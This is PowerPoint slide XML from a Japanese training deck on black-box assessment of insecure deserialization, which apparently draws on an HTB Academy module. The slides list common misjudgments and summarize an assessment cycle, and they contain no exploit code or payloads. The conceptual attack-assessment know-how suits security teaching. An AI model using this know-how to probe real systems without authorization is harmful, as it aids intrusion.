                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>新たな手がかりが出れば評価→仮説へ戻る。報告は一周の終わりではなく、次の調査対象への入力にもなる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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7F6F2"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>よくある誤検知・誤った判断</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1429941"/>
            <a:ext cx="10560050" cy="504825"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14465"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="1572816"/>
            <a:ext cx="177800" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1301750" y="1572816"/>
            <a:ext cx="10071100" cy="244475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>「署名検証エラー＝安全」と即断する</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — 署名検証と、その先のデシリアライズ処理の安全性は別の問題。検証ロジックの対象範囲・鍵管理まで確認が必要</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="2042716"/>
            <a:ext cx="10560050" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10088"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 1" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="-90" r="-90" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="2185591"/>
            <a:ext cx="165398" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1289348" y="2185591"/>
            <a:ext cx="10202873" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Base64っぽい文字列を全てシリアライズデータと決めつける</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — JWT・暗号化データ・単なるID・圧縮データも同様の見た目になり得る。シグネチャとの照合、挙動差分の観測で裏付けを取る</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="2874566"/>
            <a:ext cx="10560050" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10088"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Image 2" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="-181" b="-181"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="3017441"/>
            <a:ext cx="164505" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1288455" y="3017441"/>
            <a:ext cx="10203793" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>バージョンが一致＝ガジェットチェーン成立確実と判断する</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — 依存ライブラリの実装・設定・カスタムコードの介在により不成立となる場合がある。公開チェーンは「候補」であって「証明」ではない</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="3706416"/>
            <a:ext cx="10560050" cy="504825"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14465"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 3" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="3849291"/>
            <a:ext cx="177800" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1301750" y="3849291"/>
            <a:ext cx="9594294" cy="244475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unserialize()/pickle.loads()のgrep結果だけで判断を終える</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — PHARデシリアライズのように、危険関数を直接呼ばない経路も存在する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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14171A"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1493441"/>
            <a:ext cx="3397250" cy="1092200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9012"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="Search">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="1687116"/>
            <a:ext cx="190500" cy="190500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="1953816"/>
            <a:ext cx="3100197" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>発見は「形式の識別」だけでなく、入力点の網羅と挙動差分の観測から始まる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4397375" y="1493441"/>
            <a:ext cx="3397250" cy="1092200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9012"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 1" descr="Activity">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4591050" y="1687116"/>
            <a:ext cx="190500" cy="190500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4591050" y="1953816"/>
            <a:ext cx="3100197" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>成立性の証明は仮説→検証→観測→評価→報告のサイクルで、推測と事実を区別する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7978775" y="1493441"/>
            <a:ext cx="3397250" cy="1092200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9012"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Image 2" descr="CheckCircle">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8172450" y="1687116"/>
            <a:ext cx="190500" cy="190500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8172450" y="1953816"/>
            <a:ext cx="3100197" cy="463550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1725"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>影響評価はRCEに限らず、XSS・SQLi・LFI・DoSまで含めて行う</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="2845991"/>
            <a:ext cx="10560050" cy="902891"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10901"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="3039666"/>
            <a:ext cx="10477881"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>別紙：実務用チェックリスト／演習A〜D／講師用ガイド／参考資料一覧</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="3341886"/>
            <a:ext cx="10477881" cy="238720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1680"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>本スライドで扱いきれない詳細（15項目の診断チェックリスト、各チェック項目の完了基準、演習の設問と解答、想定質問と回答、技術的誤解の訂正方法）は講師用ガイド文書にまとめています</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="4006056"/>
            <a:ext cx="10883392" cy="416520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B7580"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>主な参照元：HTB Academy「Deserialization Attacks」モジュール（Introduction to Serialization / Introduction to Deserialization Attacks / Identifying (PHP) / Object Injection (PHP) / RCE: Magic Methods / RCE: Phar Deserialization / Useful Tools）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Deserialization Attacks — ブラックボックス診断">
  <a:themeElements>
    <a:clrScheme name="Deserialization Attacks — ブラックボックス診断">
      <a:dk1>
        <a:srgbClr val="1A1D21"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="F7F6F2"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="515355"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="E1E0DD"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="E08A3C"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="3E6FBD"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="8A4B15"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="4A5058"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="B9C2C9"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="6A7179"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="0563C1"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="954F72"/>
      </a:folHlink>
    </a:clrScheme>
